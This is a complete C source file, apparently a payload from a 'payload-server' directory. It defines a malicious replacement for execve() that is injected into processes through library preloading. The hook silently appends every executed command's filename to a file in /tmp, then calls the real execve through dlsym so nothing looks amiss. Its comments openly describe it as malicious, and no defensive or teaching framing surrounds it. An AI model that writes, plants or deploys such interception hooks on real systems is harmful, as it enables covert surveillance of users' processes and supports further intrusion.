// File: payload-server/payloads/hook.c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

/*
  This is the function signature for the real execve. We need it
  to call the original function after our code runs.
*/
typedef int (*execve_func_t)(const char *filename, char *const argv[], char *const envp[]);

/*
  This is the malicious replacement for execve.
*/
int execve(const char *filename, char *const argv[], char *const envp[]) {
    // Open our log file to append the command
    FILE *log_file = fopen("/tmp/execve_log.txt", "a");
    if (log_file != NULL) {
        fprintf(log_file, "HOOKED EXECVE: command=\"%s\"\n", filename);
        fclose(log_file);
    }

    // Find the *real* execve function in the system's C library
    execve_func_t original_execve = dlsym(RTLD_NEXT, "execve");

    // Call the original execve to let the command run normally
    return original_execve(filename, argv, envp);
}
